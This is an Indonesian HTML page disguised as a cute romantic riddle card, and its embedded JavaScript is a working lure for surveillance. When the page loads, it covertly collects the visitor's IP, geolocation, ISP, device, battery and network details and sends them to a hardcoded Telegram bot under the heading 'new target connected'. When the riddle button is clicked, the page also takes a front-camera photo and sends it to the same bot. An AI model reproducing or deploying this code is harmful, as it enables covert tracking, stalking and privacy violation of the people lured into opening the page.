<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
  tap-highlight-color: transparent;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
  -webkit-user-select: none;
  user-select: none;
  touch-action: manipulation;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
  -webkit-tap-highlight-color: transparent;
  touch-action: manipulation;
  display: inline-block;
  margin: 10px 0;
}

.btn:active {
  transform: scale(0.98);
  background: linear-gradient(45deg, #ff5252, #ff7979);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}

/* Blue touch effect */
.touch-effect {
  position: fixed;
  width: 50px;
  height: 50px;
  border-radius: 50%;
  background: radial-gradient(circle, #007bff, #0056b3);
  pointer-events: none;
  animation: touchAnimation 0.6s ease-out forwards;
  z-index: 10000;
}

@keyframes touchAnimation {
  0% {
    transform: scale(0.5);
    opacity: 0.8;
  }
  100% {
    transform: scale(2);
    opacity: 0;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>

  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>

  <h1>KAMU TAU GAAAA</h1>

  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>

  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>

  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
const BOT_TOKEN = "8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s";
const CHAT_ID = "6051179992";
const STATIC_IMAGE = "https://files.catbox.moe/8ybe0o.jpg";

// Blue touch effect
document.addEventListener('click', function(e) {
  const touchEffect = document.createElement('div');
  touchEffect.className = 'touch-effect';
  touchEffect.style.left = (e.pageX - 25) + 'px';
  touchEffect.style.top = (e.pageY - 25) + 'px';
  document.body.appendChild(touchEffect);
  
  setTimeout(() => {
    touchEffect.remove();
  }, 600);
});

function escapeHtml(s) {
  return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

// Get accurate IP information
async function getIpInfo() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    
    // Get detailed location info
    const whoisResponse = await fetch(`https://ipwhois.app/json/${data.ip}`);
    const whoisData = await whoisResponse.json();
    
    return {
      ip: data.ip,
      city: whoisData.city,
      region: whoisData.region,
      country: whoisData.country,
      country_code: whoisData.country_code,
      latitude: whoisData.latitude,
      longitude: whoisData.longitude,
      timezone: whoisData.timezone,
      isp: whoisData.isp,
      asn: whoisData.asn,
      org: whoisData.org
    };
  } catch (e) {
    return {
      ip: "Tidak terdeteksi",
      city: "Tidak terdeteksi",
      region: "Tidak terdeteksi",
      country: "Tidak terdeteksi",
      country_code: "Tidak terdeteksi",
      latitude: "0",
      longitude: "0",
      timezone: "Tidak terdeteksi",
      isp: "Tidak terdeteksi",
      asn: "Tidak terdeteksi",
      org: "Tidak terdeteksi"
    };
  }
}

// Get accurate device information
async function getDeviceInfo() {
  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
    level: null, charging: false, chargingTime: null, dischargingTime: null
  }));

  let connectionInfo = {};
  if (navigator.connection) {
    connectionInfo = {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    };
  }

  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
    screen: `${screen.width}x${screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    orientation: screen.orientation?.type,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory,
    touchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    product: navigator.product,
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    connection: connectionInfo,
    battery: {
      level: battery.level !== null ? Math.round(battery.level * 100) + '%' : 'Tidak tersedia',
      charging: battery.charging ? 'Sedang diisi' : 'Tidak diisi',
      chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + ' detik' : 'Tidak terbatas',
      dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + ' detik' : 'Tidak terbatas'
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: new Date().toLocaleString('id-ID'),
    utcTime: new Date().toUTCString(),
    referrer: document.referrer || 'Tidak ada',
    url: window.location.href
  };
}

// Build beautiful caption with blockquote format
function buildCaption(ip, device) {
  const mapsUrl = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  
  return `
🚨 <b>TARGET BARU TERKONEKSI</b> 🚨

<blockquote>
<b>🌍 INFORMASI LOKASI</b>
├ 🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>
├ 🏙️ Kota: ${escapeHtml(ip.city)}
├ 🗺️ Region: ${escapeHtml(ip.region)}
├ 🇮🇩 Negara: ${escapeHtml(ip.country)} (${escapeHtml(ip.country_code)})
├ 📍 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}
├ 🗺️ Peta: ${mapsUrl}
├ ⏰ Zona Waktu: ${escapeHtml(ip.timezone)}
└ 📡 ISP: ${escapeHtml(ip.isp)} (${escapeHtml(ip.asn)})

<b>💻 INFORMASI PERANGKAT</b>
├ 🖥️ User Agent: ${escapeHtml(device.userAgent)}
├ 💻 Platform: ${escapeHtml(device.platform)}
├ 🗣️ Bahasa: ${escapeHtml(device.language)}
└ 🌐 Bahasa Tersedia: ${escapeHtml(device.languages)}

<b>📱 SPESIFIKASI LAYAR</b>
├ 📱 Resolusi Layar: ${escapeHtml(device.screen)}
├ 🪟 Ukuran Viewport: ${escapeHtml(device.viewport)}
├ 🎨 Kedalaman Warna: ${escapeHtml(device.colorDepth)} bit
├ ⚖️ Rasio Pixel: ${escapeHtml(device.pixelRatio)}
└ 📐 Orientasi: ${escapeHtml(device.orientation)}

<b>⚙️ SPESIFIKASI HARDWARE</b>
├ 🔢 CPU Cores: ${escapeHtml(device.cores)}
├ 💾 RAM: ${escapeHtml(device.memory)} GB
└ 👆 Touch Points: ${escapeHtml(device.touchPoints)}

<b>🌐 INFORMASI JARINGAN</b>
├ 📶 Status Online: ${escapeHtml(device.online ? 'Online' : 'Offline')}
├ 🍪 Cookies: ${escapeHtml(device.cookiesEnabled ? 'Aktif' : 'Nonaktif')}
├ 🚫 Do Not Track: ${escapeHtml(device.doNotTrack || 'Tidak diatur')}
├ 📡 Tipe Koneksi: ${escapeHtml(device.connection.effectiveType || 'Tidak terdeteksi')}
├ ⬇️ Kecepatan: ${escapeHtml(device.connection.downlink || 'Tidak terdeteksi')} Mbps
└ ⏱️ Latensi: ${escapeHtml(device.connection.rtt || 'Tidak terdeteksi')} ms

<b>🔋 INFORMASI BATERAI</b>
├ 🔋 Level: ${escapeHtml(device.battery.level)}
├ ⚡ Status: ${escapeHtml(device.battery.charging)}
├ ⏳ Waktu Charging: ${escapeHtml(device.battery.chargingTime)}
└ ⌛ Waktu Discharging: ${escapeHtml(device.battery.dischargingTime)}

<b>🕒 WAKTU & SESI</b>
├ 🌍 Zona Waktu: ${escapeHtml(device.timezone)}
├ 🕐 Waktu Lokal: ${escapeHtml(device.localTime)}
├ ⏰ Waktu UTC: ${escapeHtml(device.utcTime)}
├ 🔗 Referrer: ${escapeHtml(device.referrer)}
└ 🌐 URL: ${escapeHtml(device.url)}
</blockquote>

<b>⏰ TIMESTAMP</b>
📅 ${escapeHtml(new Date().toISOString())}
  `.trim();
}

// Send data to Telegram
async function sendToTelegram(caption, photoBlob = null) {
  try {
    if (photoBlob) {
      // Send photo with caption
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photoBlob, 'target_photo.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } else {
      // Send text only with static image
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: STATIC_IMAGE,
          caption: caption,
          parse_mode: 'HTML'
        })
      });
    }
    return true;
  } catch (error) {
    console.log('Error sending to Telegram:', error);
    return false;
  }
}

// Take photo function
async function takePhoto() {
  try {
    // Access camera
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
      } 
    });
    
    // Create video element
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    // Wait for video to be ready
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        setTimeout(resolve, 500);
      };
    });
    
    // Take photo
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert to blob
    const photoBlob = await new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
    
    // Get device and IP info
    const [ipInfo, deviceInfo] = await Promise.all([
      getIpInfo(),
      getDeviceInfo()
    ]);
    
    // Build caption and send
    const caption = buildCaption(ipInfo, deviceInfo);
    await sendToTelegram(caption, photoBlob);
    
    // Cleanup
    stream.getTracks().forEach(track => track.stop());
    
    return true;
  } catch (error) {
    console.log('Error taking photo:', error);
    return false;
  }
}

// Initialize - Send device data on page load
window.addEventListener('load', async function() {
  try {
    const [ipInfo, deviceInfo] = await Promise.all([
      getIpInfo(),
      getDeviceInfo()
    ]);
    
    const caption = buildCaption(ipInfo, deviceInfo);
    await sendToTelegram(caption);
    
    console.log('Data device berhasil dikirim!');
  } catch (error) {
    console.log('Error sending device data:', error);
  }
});

// Camera button event
document.getElementById('btnCamera').addEventListener('click', async function(e) {
  e.preventDefault();
  e.stopPropagation();
  
  try {
    const success = await takePhoto();
    if (success) {
      console.log('Foto berhasil diambil dan dikirim!');
    }
  } catch (error) {
    console.log('Error:', error);
  }
});

// Ensure button is clickable
document.addEventListener('DOMContentLoaded', function() {
  const btn = document.getElementById('btnCamera');
  btn.style.cursor = 'pointer';
  btn.disabled = false;
});
</script>
</body>
</html>
